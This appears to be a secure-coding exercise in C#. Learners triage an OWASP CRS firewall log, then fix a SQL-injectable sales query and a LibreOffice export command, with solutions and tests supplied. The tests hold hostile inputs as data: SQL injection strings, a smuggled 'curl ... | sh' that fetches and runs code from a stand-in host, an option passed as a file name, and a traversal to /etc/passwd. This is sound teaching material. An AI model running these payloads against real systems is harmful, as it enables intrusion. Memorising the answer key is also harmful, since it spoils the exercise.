title: Boss: the WAF log from Tuesday night
summary: The web application firewall was in detection-only mode, and it logged a night of injection attempts. Find what got through, then fix the two endpoints it points at.

steps.title: waf.log, 02:10 to 02:14
body: The WAF runs the OWASP Core Rule Set (CRS). Its rule ids say what it saw: **942xxx** SQL injection, **932xxx** Unix command injection, **930xxx** path traversal, **941xxx** XSS. It was set to **detection only** (`SecRuleEngine DetectionOnly`), so it logged and let everything through. The status code shows what the app answered.
Matched rules with a **2xx** answer are the ones to worry about: the app accepted the payload. The `400` and `404` lines were refused by the app itself.

steps.title: Triage: which endpoints accepted attacks?
prompt: Write `List<string> AcceptedAttacks(string[] lines)`. Each line is `time ip METHOD target status [rule=id]`, separated by single spaces. Count the lines that have a `rule=` **and** a status from 200 to 299, per **path** (the target up to `?`). Return one string per path, `"<path> <count>"`, most attacks first, ties by path (ordinal).
solution: if (!int.TryParse(parts[4], out var status) || status is < 200 or > 299) continue;
hints: `line.Split(' ')`: index 3 is the target, index 4 the status, and a rule, if any, comes after.
Count into a `Dictionary<string, int>`, then `OrderByDescending(kv => kv.Value).ThenBy(kv => kv.Key, StringComparer.Ordinal)`.
template: Dojo.Eq("an empty log", new List<string>(), AcceptedAttacks(Array.Empty<string>()));
Dojo.Eq("refused attacks (4xx) and clean requests do not count", new List<string>(), AcceptedAttacks(new[] { dojoLog[0], dojoLog[3], dojoLog[5], dojoLog[6] }));
Dojo.Eq("most first", new List<string> { "/b 2", "/a 1" }, AcceptedAttacks(new[] { "t i GET /a 201 rule=1", "t i GET /b?x=1 200 rule=2", "t i GET /b 204 rule=3" }));

steps.title: Fix the sales report
prompt: `long MonthlySales(SqliteConnection db, string region, string month)` sums `total_cents` of the `sales` rows for one region and month (`month` like `2026-10`). Both values are glued into the SQL. Use **parameters** for both. A region or month that matches nothing gives `0`.
starter: long MonthlySales(SqliteConnection db, string region, string month)
cmd.CommandText = "SELECT coalesce(sum(total_cents), 0) FROM sales WHERE region = '" + region + "' AND month = '" + month + "'";
solution: long MonthlySales(SqliteConnection db, string region, string month)
cmd.CommandText = "SELECT coalesce(sum(total_cents), 0) FROM sales WHERE region = $region AND month = $month";
template: using var dojoDb = new SqliteConnection("Data Source=:memory:");
c.CommandText = "CREATE TABLE sales (region TEXT, month TEXT, total_cents INTEGER);" +
"CREATE TABLE users (username TEXT, password_hash TEXT); INSERT INTO users VALUES ('admin', 'aaaa');";
Dojo.Try("north, October", () => Dojo.Eq("north in 2026-10 sold 150000 cents", 150000L, MonthlySales(dojoDb, "north", "2026-10")));
Dojo.Try("no sales", () => Dojo.Eq("an empty month is 0", 0L, MonthlySales(dojoDb, "east", "2026-10")));
Dojo.Try("the OR payload from the log", () => Dojo.Eq("north' OR '1'='1 sums nothing", 0L, MonthlySales(dojoDb, "north' OR '1'='1", "2026-10")));
Dojo.Try("a quote in the month", () => Dojo.Eq("x' OR 1=1-- in month sums nothing", 0L, MonthlySales(dojoDb, "north", "x' OR 1=1--")));
Dojo.Try("a region with an apostrophe", () => Dojo.Eq("Hawke's Bay is a value, not SQL", 0L, MonthlySales(dojoDb, "Hawke's Bay", "2026-10")));
hints: Two placeholders, `$region` and `$month`, and two `cmd.Parameters.AddWithValue(...)` calls.

steps.title: Fix the export command
prompt: The export converts a stored spreadsheet with LibreOffice. Write `ProcessStartInfo ExportCommand(string format, string file)` (`using System.Diagnostics;` and `using System.Text.RegularExpressions;`):
- `format` must be one of `pdf`, `xlsx`, `csv` (exactly, lower case); `file` must match `^report-\d{4}-\d{2}\.ods\z`. Anything else throws `ArgumentException`;
Both lines of the log with rule 932100 must be refused: the `;curl ... | sh` in `format`, and the `-env:...` option smuggled in as a file name.
solution: if (!formats.Contains(format)) throw new ArgumentException("Unknown format.", nameof(format));
if (!Regex.IsMatch(file, @"^report-\d{4}-\d{2}\.ods\z")) throw new ArgumentException("Unknown report.", nameof(file));
var psi = new ProcessStartInfo("libreoffice") { UseShellExecute = false };
foreach (var a in new[] { "--headless", "--convert-to", format, "--outdir", "/srv/exports", "--", "/srv/reports/" + file })
template: Dojo.Eq("no shell: FileName is libreoffice", "libreoffice", ok.FileName);
Dojo.Eq("the arguments, one by one", new List<string> { "--headless", "--convert-to", "pdf", "--outdir", "/srv/exports", "--", "/srv/reports/report-2026-10.ods" }, ok.ArgumentList.ToList());
Dojo.Throws<ArgumentException>("the log's format payload is refused", () => ExportCommand("pdf;curl http://203.0.113.50/x|sh", "report-2026-10.ods"));
Dojo.Throws<ArgumentException>("the log's option-as-file-name is refused", () => ExportCommand("xlsx", "-env:UserInstallation=file:///tmp/x"));
Dojo.Throws<ArgumentException>("a traversal file name is refused", () => ExportCommand("pdf", "../../etc/passwd"));
Dojo.Throws<ArgumentException>("an upper-case format is refused", () => ExportCommand("PDF", "report-2026-10.ods"));
Dojo.Throws<ArgumentException>("a trailing newline is refused", () => ExportCommand("pdf", "report-2026-10.ods\n"));
hints: An allow-list for the format (`new[] { "pdf", "xlsx", "csv" }.Contains(format)`) and a regex for the file; `\z` (not `$`) so a trailing newline cannot slip through.
Then `new ProcessStartInfo("libreoffice") { UseShellExecute = false }` and `ArgumentList.Add` for each argument, with `--` before the path.
